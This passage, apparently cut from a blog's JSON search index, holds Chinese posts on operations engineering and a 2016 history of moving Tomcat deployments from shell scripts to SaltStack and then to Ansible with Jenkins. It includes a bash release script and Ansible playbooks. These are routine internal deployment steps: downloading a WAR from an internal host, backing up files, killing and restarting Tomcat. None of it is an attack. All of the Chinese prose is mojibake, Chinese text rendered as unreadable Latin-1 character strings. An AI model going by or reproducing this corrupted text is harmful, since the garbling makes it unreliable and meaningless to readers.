çš„å…¬å¸ä¹Ÿæœ‰ä¸€äº›å¼€æºè§£å†³åŠæ³•å¦‚lvs+ha,éå¸¸çµæ´»ï¼›å¯¹äºåä¸¤ç§ï¼Œé‚£å°±è€ƒéªŒå…¬å¸æŠ€æœ¯å®åŠ›åŠåº”ç”¨ç‰¹ç‚¹äº†ï¼Œç¬¬ä¸‰ç§DFSä¸»è¦åº”ç”¨äºæµ·é‡æ•°æ®åº”ç”¨ä¸Šï¼Œå¦‚é‚®ä»¶ã€æœç´¢ç­‰åº”ç”¨ï¼Œç‰¹åˆ«æ˜¯æœç´¢è¦æ±‚å°±æ›´é«˜äº†ï¼Œé™¤äº†ç®€å•æµ·é‡å­˜å‚¨ï¼Œè¿˜åŒ…æ‹¬æ•°æ®æŒ–æ˜ã€ç”¨æˆ·è¡Œä¸ºåˆ†æï¼›å¦‚googleã€yahooå°±èƒ½ä¿å­˜åˆ†æè¿‘ä¸€å¹´çš„ç”¨æˆ·è®°å½•æ•°æ®ï¼Œè€Œbaiduåº”è¯¥å°‘äº30å¤©ã€soguoå°±æ›´å°‘äº†ã€‚ã€‚ã€‚è¿™äº›å¯¹äºæœç´¢å‡†å¤‡æ€§ã€åŠç”¨æˆ·ä½“éªŒæ˜¯è‡³å…³é‡è¦çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†è°ˆè°ˆå¦‚ä½•ç§‘å­¦çš„ç®¡ç†é›†ç¾¤ï¼Œæœ‰ä»¥ä¸‹å…³é”®å‡ ç‚¹ï¼šIã€ç›‘æ§ä¸»è¦åŒ…æ‹¬æ•…éšœç›‘æ§å’Œæ€§èƒ½ã€æµé‡ã€è´Ÿè½½ç­‰çŠ¶æ€ç›‘æ§ï¼Œè¿™äº›ç›‘æ§å…³ç³»åˆ°é›†ç¾¤çš„å¥åº·è¿è¡Œï¼ŒåŠæ½œåœ¨é—®é¢˜çš„åŠæ—¶å‘ç°ä¸å¹²é¢„ï¼›aã€æœåŠ¡æ•…éšœã€çŠ¶æ€ç›‘æ§ï¼šä¸»è¦æ˜¯å¯¹æœåŠ¡å™¨è‡ªèº«ã€ä¸Šå±‚åº”ç”¨ã€å…³è”æœåŠ¡æ•°æ®äº¤äº’ç›‘æ§ï¼›ä¾‹å¦‚é’ˆå¯¹å‰ç«¯webserverï¼Œæˆ‘ä»¬å°±å¯ä»¥æœ‰å¾ˆå¤šç§ç±»å‹çš„ç›‘æ§ï¼ŒåŒ…æ‹¬åº”ç”¨ç«¯å£çŠ¶æ€ç›‘æ§ï¼Œä¾¿äºåŠæ—¶å‘ç°æœåŠ¡å™¨æˆ–åº”ç”¨æœ¬èº«æ˜¯å¦crashã€é€šè¿‡icmpåŒ…æ¢æµ‹æœåŠ¡å™¨å¥åº·çŠ¶æ€ï¼Œæ›´ä¸Šå±‚å¯èƒ½è¿˜åŒ…æ‹¬åº”ç”¨å„é¢‘é“ä¸šåŠ¡çš„ç›‘æ§ï¼Œå¸¸ç”¨æ–¹æ³•æ˜¯é‡‡ç”¨é¢ä¸šç‰¹å¾ç è¿›è¡Œåˆ¤æ–­ï¼Œæˆ–å¯¹é‡ç‚¹é¡µé¢è¿›è¡Œç­¾åï¼Œä»¥ç½‘ç«™è¢«é»‘ç¯¡æ”¹ï¼ˆæŠ¥è­¦ã€å¹¶è‡ªåŠ¨æ¢å¤è¢«ç¯¡æ”¹æ•°æ®ï¼‰ç­‰ç­‰ï¼Œè¿™äº›åªæ˜¯ä¸€éƒ¨ä»½ï¼Œè¿˜æœ‰Nå¤šç›‘æ§æ–¹å¼ï¼Œä¾åº”ç”¨ç‰¹ç‚¹è€Œå®šï¼Œè¿˜æœ‰ä¸€äº›é—®é¢˜éœ€è§£å†³ï¼Œå¦‚é›†ç¾¤è¿‡å¤§ï¼Œå¦‚ä½•é«˜æ€§èƒ½çš„è¿›è¡Œç›‘æ§ä¹Ÿæ˜¯ä¸€ä¸ªç°å®é—®é¢˜ã€‚bã€å…¶å®ƒå°±æ˜¯é›†ç¾¤çŠ¶æ€ç±»çš„ç›‘æ§æˆ–ç»Ÿè®¡ï¼Œä¸ºæˆ‘ä»¬åˆç†ç®¡ç†è°ƒä¼˜é›†ç¾¤æä¾›æ•°æ®å‚è€ƒã€åŒ…æ‹¬æœåŠ¡ç“¶é¢ˆã€æ€§èƒ½é—®é¢˜ã€å¼‚å¸¸æµé‡ã€æ”»å‡»ç­‰é—®é¢˜ã€‚IIã€æ•…éšœç®¡ç†aã€ç¡¬ä»¶æ•…éšœé—®é¢˜ï¼›å¯¹äºæˆç™¾ä¸Šåƒæˆ–ä¸Šä¸‡æœºå™¨çš„Nå¤šé›†ç¾¤ï¼ŒæœåŠ¡å™¨æ­»æœºã€ç¡¬ä»¶æ•…éšœæ¦‚ç‡æ˜¯éå¸¸å¤§çš„ï¼Œå‡ ä¹æ¯æ—¶æ¯åˆ»éƒ½æœ‰æœåŠ¡ç¡¬ä»¶é—®é¢˜ï¼Œæ­»æœºã€ç¡¬ç›˜æŸåã€ç”µæºã€å†…å­˜ã€äº¤æ¢æœºã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åœ¨è®¾è®¡ç½‘ç«™æ¶æ„æ—¶éœ€è¦å……åˆ†è€ƒè™‘åˆ°è¿™äº›é—®é¢˜ï¼Œå¹¶å°†å…¶è§†ä¸ºå¸¸æ€ï¼›æ›´å¤šçš„ä¾é åº”ç”¨çš„å†—ä½™æœºåˆ¶æ¥è§„é¿è¿™ç§é£é™©ï¼Œä½†ç»™ç³»ç»Ÿå·¥ç¨‹å¸ˆè¶³å¤Ÿå®½è£•çš„å¤„ç†æ—¶é—´ã€‚ï¼ˆå¦‚googleä¸æ˜¯å·ç§°åŒæ—¶æ­»800å°æœºå™¨ï¼ŒæœåŠ¡ä¸ä¼šå—åˆ°ä»»ä½•å½±å“å—ï¼‰ï¼›è¿™å°±æ˜¯è€ƒéªŒè¿ç»´å·¥ç¨‹å¸ˆåŠç½‘ç«™æ¶æ„å¸ˆåŠŸèƒ½çš„åœ°æ–¹äº†ï¼Œå¥½çš„è®¾è®¡èƒ½è¾¾åˆ°googleæ‰€æè¿°è‡ªæ¢å¤èƒ½åŠ›ï¼Œå¦‚gfsï¼Œç³Ÿç³•çš„è®¾è®¡é‚£å°±æ˜¯ä¸€å°æœåŠ¡å™¨çš„æ­»æœºå¯èƒ½ä¼šé€ æˆå¤§é¢ç§¯æœåŠ¡çš„è¿é”æ•…éšœåæ˜ ï¼Œç›´æ¥å¯¹ç”¨æˆ·æ‹’ç»å“åº”ã€‚bã€åº”ç”¨æ•…éšœé—®é¢˜ï¼›å¯èƒ½æ˜¯æŸä¸€bugè¢«è§¦å‘ã€æˆ–æŸä¸€æ€§èƒ½é˜€å€¼è¢«è¶…è¶Šã€æ”»å‡»ç­‰æƒ…å†µä¸ä¸€è€Œå®šï¼Œä½†é‡è¦çš„ä¸€ç‚¹ï¼Œæ˜¯è¦æœ‰å¯¹è¿™äº›é—®é¢˜çš„é¢„é˜²æ€§æªæ–½ï¼Œä¸èƒ½æƒ³å½“ç„¶ï¼Œå®ƒä¸ä¼šå‡ºé—®é¢˜ï¼Œå¦‚çœŸå‡ºé—®é¢˜äº†ï¼Œå¦‚ä½•åº”å¯¹ï¼Ÿè¿™éœ€è¦è¿ç»´å·¥ç¨‹å¸ˆå¹³æ—¶åšè¶³åŠŸå¤«ï¼ŒåŒ…æ‹¬åº”æ€¥å“åº”é€Ÿåº¦ã€æ•…éšœå¤„ç†çš„ç§‘å­¦æ€§ã€å¤‡ç”¨æ–¹æ¡ˆçš„æœ‰æ•ˆç­‰ã€‚IIIã€è‡ªåŠ¨åŒ–è‡ªåŠ¨åŒ–ï¼šç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å°†æˆ‘ä»¬æ—¥å¸¸æ‰‹åŠ¨è¿›è¡Œçš„ä¸€äº›å·¥ä½œé€šè¿‡å·¥å…·ï¼Œç³»ç»Ÿè‡ªåŠ¨æ¥å®Œæˆï¼Œè§£æ”¾æˆ‘ä»¬çš„åŒæ‰‹åŠæ¯ç‡¥çš„é‡å¤æ€§åŠ³åŠ¨ï¼Œä¾‹å¦‚ï¼šæ²¡æœ‰å·¥å…·å‰ï¼Œæˆ‘ä»¬å®‰è£…ç³»ç»Ÿéœ€è¦ä¸€å°ä¸€å°è£¸æœºå®‰è£…ï¼Œå¦‚2000å°ï¼Œå¯èƒ½éœ€è¦10äºº/10å¤©ï¼Œæçƒ‚Nå¼ å…‰ç›˜ï¼ŒäººåŠ›æˆæœ¬æ›´å¤§ã€‚ã€‚ã€‚è€Œç°åœ¨é€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·ï¼Œåªéœ€å‡ ä¸ªç®€å•å‘½ä»¤å°±èƒ½æå®šã€è¿˜æœ‰å¦‚æœºå™¨äººç±»ç¨‹åºï¼Œè‡ªåŠ¨å®Œæˆä»¥å¾€æ¯å¤©äººå·¥å¹²é¢„çš„å·¥ä½œï¼Œä½¿å…¶è‡ªåŠ¨å®Œæˆã€æ±‡æŠ¥ç»“æœï¼Œå¹¶å…·å¤‡ä¸€å®šçš„ä¸“å®¶ç³»ç»Ÿèƒ½åŠ›ï¼Œèƒ½åšä¸€äº›ç®€å•çš„æ˜¯/éåˆ¤æ–­ã€ä¼˜åŒ–é€‰æ‹©ç­‰ã€‚ã€‚ã€‚è¿™äº›å¥½å¤„éå¸¸æ˜æ˜¾ä¸å†å¤šè¯´ã€‚ã€‚ã€‚åº”è¯¥è¯´ï¼Œè‡ªåŠ¨åŒ–è¿ç»´æ˜¯è¿ç»´å·¥ç¨‹å¸ˆèŒä¸šåŒ–çš„ä¸€ä¸ªè¿½æ±‚ï¼Œåˆ©å·²åˆ©å…¬ï¼Œè™½ç„¶è¿™æ˜¯ä¸€ä¸ªå¼‚å¸¸è‰°å·¨çš„ä»»åŠ¡ï¼šä¸æ–­å˜æ›´çš„ä¸šåŠ¡ã€ä¸è§„èŒƒåŒ–çš„åº”ç”¨è®¾è®¡ã€å¼€å‘æ¨¡å¼ã€ç½‘ç»œæ¶æ„å˜æ›´ã€IDCå˜æ›´ã€è§„èŒƒå˜åŠ¨ç­‰å› ç´ ï¼Œéƒ½å¯èƒ½ä¼šå¯¹ç°æœ‰è‡ªåŠ¨åŒ–ç³»ç»Ÿäº§ç”Ÿå½±å“ï¼Œæ‰€ä»¥éœ€è¦æ¨¡å—åŒ–ã€æ¥å£åŒ–ã€å˜å› å‚æ•°åŒ–ç­‰å› æ­¤ï¼Œè‡ªåŠ¨åŒ–ç›¸å…³å·¥ä½œï¼Œæ˜¯è¿ç»´å·¥ç¨‹å¸ˆçš„æ ¸å¿ƒé‡ç‚¹å·¥ä½œä¹‹ä¸€ï¼Œä¹Ÿæ˜¯ä»·å€¼çš„ä½“ç°ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2016/09/21/è¿ç»´ç¬”è®°/è¿ç»´å·¥ç¨‹å¸ˆçš„èŒè´£å’Œå‰æ™¯/"},{"title":"è¿ç»´è‡ªåŠ¨åŒ–æ€»ç»“-è®°å½•å¸®åŠ©å…¬å¸è‡ªåŠ¨åŒ–æ¶æ„æ¼”å˜è¿‡ç¨‹","text":"è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘å‰è¨€ï¼šä¸ªäºº2014å¹´å¼€å§‹ç©è‡ªåŠ¨åŒ–çš„ä¹Ÿæ˜¯åˆšä»ä¸šè‡ªåŠ¨åŒ–è¿ç»´å²—ä½ç¬¬ä¸€ä»½å·¥ä½œï¼Œåœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸åšIDC+APM+CDNåšäº‘åŠ é€Ÿçš„åº”è¯¥å¾ˆå¤šç©cdnçš„éƒ½å¬è¯´è¿™å®¶å…¬å¸ï¼mmtrix.comã€‚ ä¸€å¼€å§‹å¼€å§‹æ·±åº¦å­¦ä¹ çš„æ˜¯SaltStackæ‰€ä»¥æŒæ¡çš„æ¯”è¾ƒæ·±æ›´åŠ ç†Ÿç»ƒï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå¥½æœ‹å‹æ¨èæˆ‘çœ‹äº†ä¸€æœ¬ä¹¦pythonå…¥é—¨åˆ°ç²¾é€š é‡Œé¢æœ‰è¯¦ç»†è®²åˆ°saltå®‰è£…å’Œä½¿ç”¨éƒ¨ç½²è‡ªåŠ¨åŒ–å„ç§æ“ä½œï¼Œçš„ç¡®å¾ˆæ–¹ä¾¿ã€‚åé¢åœ¨æµ‹è¯•ç¯å¢ƒæˆ‘è‡ªå·±ç®¡ç†å‡ åå°æœåŠ¡å™¨ï¼å­¦ä¹ ä½¿ç”¨Ansibleå»æ“ä½œï¼Œå› ä¸ºsaltè·Ÿansibleæœ€å¤§çš„åŒºåˆ«ï¼Œé™¤äº†ansibleå¿«é€Ÿä¸Šæ‰‹å’Œä¸éœ€è¦å¤æ‚çš„å®‰è£…ï¼Œä¸»è¦åœ¨å†…ç½‘æ–¹é¢æ¯”saltæ›´ç¨³å®šæ¶æ„ä¹Ÿæ¯”saltå¥½ã€‚ åœ¨çº¿ä¸Šæˆ‘ä»¬éƒ½æ˜¯ç”¨saltå»æ“ä½œçš„ï¼Œå¯æ˜¯å½“æ—¶å…¬å¸è¿˜æ²¡æœ‰è¿ç»´å¼€å‘çš„äººå‘˜ï¼Œæ‰€ä»¥åæ¥saltåœ¨ç»ˆç«¯æ“ä½œå‡ºäº†å¾ˆå¤šé”™ï¼š 12ç¬¬ä¸€ï¼šäººå‘˜æ“ä½œå¤±è¯¯ä¸€æ¬¡ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ‰€æœ‰çš„æœåŠ¡å™¨éƒ½ä¼šå—å½±å“ã€‚ç¬¬äºŒï¼šå‘½ä»¤å¤ªå¤šæœåŠ¡æƒé™éœ€è¦ä¸€ä¸€ç»Ÿä¸€åˆ†é…ç™»é™†ç»ˆç«¯æ“ä½œã€‚ é‚£æ—¶å€™æœåŠ¡å™¨æœ‰500å¤šå°é‚£æ—¶å€™è¿ç»´æ“ä½œèµ·æ¥è¿˜æ˜¯æŒºè´¹åŠ›çš„ã€‚ ç»å†ï¼š2016å¹´åˆ3æœˆä»½å»å‚åŠ 360çš„ä¸€æ¬¡è¿ç»´å¤§ä¼šï¼Œç‹æµ©å®‡360çš„è¿ç»´å¼€å‘äººå‘˜åˆ†äº«äº†ä¸€ç‰‡æ–‡ç« ï¼šå¤§è§„æ¨¡é›†ç¾¤ä¸Šçš„å¤šä¸šåŠ¡çº¿ç¯å¢ƒéƒ¨ç½². è®²çš„éå¸¸å¥½ï¼Œç”¨çš„æ˜¯Puppetå»å®ç°3000å¤šå°çš„æœåŠ¡å™¨éƒ¨ç½²ï¼ŒæŒ‡å®šéƒ¨ç½²å®‰è£…åŒ…ç­‰ç­‰ã€‚éå¸¸æ–¹ä¾¿ã€‚ è¿™é‡Œä¹Ÿåœ¨Infoqä¸Šé¢æœ‰ä»–çš„åˆ†äº«ä½œå“æˆ‘è¿™é‡Œç²˜è´´å‡ºæ¥äº†ï¼šå¤§è§„æ¨¡é›†ç¾¤ä¸Šçš„å¤šä¸šåŠ¡çº¿ç¯å¢ƒéƒ¨ç½² ä¸ªäººç°åœ¨è¿ç»´è‡ªåŠ¨åŒ–æ¼”å˜è¿‡ç¨‹ç»éªŒï¼šæˆ‘ç°åœ¨åœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸æ——ä¸‹æ§è‚¡åŒ»ç–—å¤§æ•°æ®å­å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨ï¼Œè´Ÿè´£ITç½‘ç»œå®‰å…¨åŠå…¬ï¼šä¸»è¦åšçš„åº”ç”¨è¿ç»´å’Œç½‘ç»œè¿ç»´ï¼Œå…¼å¤§æ•°æ®è¿ç»´ã€‚ ç¬¬ä¸€ä¸ªç‰ˆæœ¬å…¬å¸æ•´ä½“æœåŠ¡æ¶æ„ï¼š 2016å¹´2æœˆä»½è„šæœ¬å½¢å¼è‡ªåŠ¨åŒ–å‘å¸ƒï¼š16å¹´2æœˆä»½è¿™é‡Œçš„Tomcatè‡ªåŠ¨åŒ– å‘å¸ƒæˆ‘ä¸€å¼€å§‹ä½¿ç”¨shellè„šæœ¬å»å®ç°è‡ªåŠ¨åŒ–å‘å¸ƒå’Œå›æ»šã€‚ 2016å¹´4æœˆä»½saltè‡ªåŠ¨åŒ–è¿œç¨‹æ§åˆ¶è„šæœ¬å‘å¸ƒï¼š16å¹´4æœˆä»½è¿™é‡Œçš„tomcatæœåŠ¡å¢å¤šï¼Œå‘ç°è„šæœ¬å‘å¸ƒæ‰‹å·¥æ“ä½œå¤ªç¹çï¼Œè€Œä¸”å‡ºç°é—®é¢˜å‡ ç‡å¤§ï¼Œæ•ˆç‡ä¸é«˜ã€‚æ¯æ¬¡ä¸€æ¬¡å¤§ç‰ˆæœ¬æ”¹åŠ¨å‘å¸ƒä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ã€‚ è¿™é‡Œè·ŸéšæœåŠ¡æ¨¡å—å¢å¤šï¼Œç°åœ¨æœåŠ¡å™¨90å¤šå°ï¼Œç»Ÿä¸€saltè‡ªåŠ¨åŒ–è°ƒç”¨æ¯å°å¯¹åº”è„šæœ¬å‘å¸ƒå›æ»šã€‚ è¿™é‡Œè´´ä¸Šæˆ‘å†™çš„saltç»“åˆè°ƒç”¨è„šæœ¬å‘½ä»¤ï¼Œå†™åœ¨å‘å¸ƒæœºå™¨ä¸Šé¢ã€‚è¿™æ ·å°±ä¸éœ€è¦è¿›å…¥æœºå™¨æ¯å°æ‰§è¡Œå¯¹åº”å‘å¸ƒè„šæœ¬ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bash#author chengyangyang#2016å¹´5æœˆ25æ—¥#this script is only for CentOS 6#check the OS#This script is used for the project release, which needs to be run by the root userplatform=`uname -i`if [ $platform != \"x86_64\" ];thenecho \"this script is only for 64bit Operating System !\"exit 1fiecho \"the platform is ok\"version=`cat /etc/redhat-release |awk '&#123;print substr($3,1,1)&#125;'`if [ $version != 6 ];thenecho \"this script is only for CentOS 6 !\"exit 1ficat &lt;&lt; EOF+----------------------------------------+| your system is CentOS 6 x86_64 || start Update release tomcat....... |+----------------------------------------+EOF#To determine whether the root permissionsif [ \"$UID\" != '0' ]then echo 'Permission denied, please switch the root tomcat.' exit 60fisalt \"node\" cmd.run \"curl -O http://10.47.100.90/ihaozhuo/war/haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"md5sum haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"mv haozhuo-tomcat.war java_war/\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"sh /root/update/tomcat.sh\"[ $? -ne 0 ] &amp;&amp; exit 1salt 'node' cmd.run '/etc/init.d/tomcat-tomcat stop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'salt 'node' cmd.run '/etc/init.d/tomcat-tomcat start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'[ $? -ne 0 ] &amp;&amp; exit 1 2016å¹´5æœˆä»½å»é™¤äº†saltæ›¿æ¢æ›´æ–°Ansible + Jenkins+Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°Ansible vs SaltStack å¯¹æ¯”ï¼Ÿ1. è‡ªèº«è¿ç»´SaltStackéœ€è¦åœ¨Masterå’ŒMinionä¸»æœºå¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ï¼Œè‡ªèº«éœ€è¦æ£€æµ‹å®ˆæŠ¤è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼Œå¢åŠ è¿ç»´æˆæœ¬ã€‚Ansibleå’Œè¿œç«¯ä¸»æœºä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡æ ‡å‡†SSHè¿›è¡Œï¼Œè¿œç¨‹ä¸»æœºä¸Šåªéœ€è¦è¿è¡ŒSSHè¿›ç¨‹å°±å¯ä»¥è¿›è¡Œè¿ç»´æ“ä½œï¼ŒSSHæ˜¯æœºæˆ¿ä¸»æœºä¸­ä¸€èˆ¬éƒ½å®‰è£…å’Œå¯åŠ¨çš„è¿›ç¨‹ï¼Œæ‰€ä»¥åœ¨Ansibleè¿›è¡Œè¿ç»´çš„æ—¶å€™åªéœ€è¦å…³æ³¨Ansibleä¸»æœºçš„è¿è¡ŒçŠ¶æ€ã€‚Ansibleå¯¹æœºæˆ¿è¿ç»´ä¸ä¼šå¢åŠ è¿‡å¤šçš„è¿ç»´æˆæœ¬ã€‚ä»å·¥å…·æœ¬èº«çš„è¿ç»´è§’åº¦æ¥è¯´ï¼ŒAnsibleè¦æ¯”SaltStackç®€å•å¾ˆå¤šã€‚ 2. ä½¿ç”¨è¯­æ³•Ansibleçš„Playbookè¯­æ³•è¦æ¯”SaltStackçš„Stateè¯­æ³•å…·æœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­å‘ç°Ansibleåœ¨å®ç°loopçš„æ›´åŠ çš„ç®€æ´ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚ åŒæ ·Ansibleçš„Notifyæ¨¡å—å’ŒHandleræ¨¡å—å®ç°çš„åŠŸèƒ½å’ŒSaltStackçš„watchå’Œmodule.waitçš„æ¨¡å—å®ç°åŠŸèƒ½ä¹Ÿç±»ä¼¼ï¼Œä¹Ÿæ¯”SaltStackè¦ç®€æ´æ˜äº†ã€‚ æ€»ä¹‹ï¼ŒAnsibleçš„å®‰å…¨æ€§èƒ½æ¯”SaltStackå¥½ï¼Œè‡ªèº«è¿ç»´ç®€å•ï¼Œä½¿ç”¨è¯­æ³•å¯è¯»æ€§æ›´å¼ºï¼Œè™½ç„¶åœ¨å“åº”é€Ÿåº¦æ–¹é¢ä¸å¦‚SaltStackï¼Œä½†æ˜¯åœ¨å¤§éƒ¨åˆ†åº”ç”¨åœºæ™¯ä¸‹Ansibleçš„å“åº”é€Ÿåº¦èƒ½æ»¡è¶³éœ€æ±‚ã€‚å› æ­¤ï¼Œåœ¨é‡‘èè¡Œä¸šçš„è‡ªåŠ¨åŒ–è¿ç»´ç³»ç»Ÿï¼ŒAnsibleå·¥å…·æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚ å¯¹åº”æ¨¡å— account.yml åœ¨Jenkinsè‡ªåŠ¨åŒ–å†™ä¸Šå˜é‡å¯¹åº”.ymlå‰ç¼€åç§°ã€‚è¿™é‡Œä¾ç„¶è°ƒç”¨è„šæœ¬å»è·‘ã€‚ 12345678910111213141516- hosts: tomcat-account_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-account copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-account/target/haozhuo-account.war dest=/root/java_war/haozhuo-account.war - name : restart shell : /root/update/account.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_account/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_account/bin nohup ./startup.sh &amp; async : 0 2016å¹´6æœˆä»½åœ¨ansibleæ”¹è¿›ymlä»£ç è¯­æ³•ã€‚å»é™¤äº†æ¯å°æœåŠ¡å™¨æ–°å¢å‘å¸ƒè„šæœ¬ï¼Œè¿™ä¸ªè¿‡ç¨‹å¤ªè¿‡äºå¤æ‚ï¼Œç»Ÿä¸€ä¸€å°å‘å¸ƒæœºå¤„ç†å³å¯ã€‚è¿™é‡Œæˆ‘è´´å‡ºymlä»£ç  Jenkinsç›´æ¥è°ƒç”¨ç›¸åº”æ¨¡å—å‘å¸ƒï¼Œè‡ªç„¶ä¼šå»æ‰§è¡Œå¯¹åº”ymlä»£ç ã€‚æ¯å°æœåŠ¡å™¨ä¸éœ€è¦æ”¾å‘å¸ƒå›æ»šè„šæœ¬ã€‚ 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 vars:#jenkins-æ‰“åŒ…ç›®å½• TESTWAR: /root/java_war/haozhuo-family.war#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®çš„tomcatæ‰€åœ¨çš„ä½ç½® OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#ç”Ÿäº§ç¯å¢ƒä¸­è€ç‰ˆæœ¬é¡¹ç›®æ‰€åœ¨webappså¤‡ä»½ç›®å½•çš„ä½ç½® backupwebapps: /srv/tomcat/tomcat_family/warbackup#ä»jenkins-æ‰“åŒ…ç¯å¢ƒè·å–çš„æ–°ç‰ˆæœ¬waråŒ…æ‰€åœ¨çš„ä½ç½® NEWWAR: /root/java_war/#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®waråŒ…çš„åå­— WARNAME: haozhuo-family.war#killæœåŠ¡typeè·¯å¾„ DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp; 3. æ€»ç»“åœ¨é‡‘èé¢†åŸŸä¸­ï¼Œå®‰å…¨æ˜¯æœ€é‡è¦çš„è€ƒè™‘å› ç´ ï¼Œåœ¨ä¼—å¤šè‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç§ï¼ŒAnsibleçš„å®‰å…¨æ€§èƒ½æœ€å¥½ï¼Œæ˜¯ç›®å‰æœ€é€‚åˆé‡‘èé¢†åŸŸçš„è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ã€‚æœ¬æ–‡é€šè¿‡å°†Ansibleå¾®æœåŠ¡åŒ–ï¼Œé›†æˆåˆ°è‡ªåŠ¨åŒ–è¿ç»´å¹³å°ä¸­ï¼Œå®ç°è‡ªåŠ¨åŒ–è¿ç»´å¹³å°é«˜å¹¶å‘æ‰§è¡Œè¿ç»´æ“ä½œåœºæ™¯å’Œå®æ—¶æ”¶é›†æ‰§è¡Œç»“æœã€‚ 2016å¹´7æœˆä»½Jenkinsä¸Šé¢å®ç°æŒç»­é›†æˆè¿™é‡ŒJenkinsæ‰“é€šgitlabè‡ªåŠ¨å‘å¸ƒï¼Œå®¡è®¡ä»£ç ã€‚ è¿™é‡Œç»“åˆopenVPN+è°·æ­ŒäºŒæ¬¡åŠ¨æ€è®¤è¯æ•ˆæœç»™äºˆå¼€å‘ä»–ä»¬å¼€æ”¾ç¯å¢ƒã€‚æ¶æ„å›¾ ï¼š 2016å¹´9æœˆä»½å…¬å¸æ¶æ„æ¼”å˜ä»ä¼ ç»Ÿæ¶æ„æ›´æ¢dubboæ¶æ„ã€‚å…¬å¸åº”ç”¨æœåŠ¡æ¶æ„å›¾è¿™é‡Œè´´å‡ºæ¥ï¼šDubboæ¶æ„è®¾è®¡è¯¦è§£ ç³»ç»Ÿæ¶æ„å›¾è¿™é‡Œæˆ‘åæœŸåœ¨æ›´æ–°è´´å‡ºæ¥ã€‚ 2017å¹´3æœˆä»½ 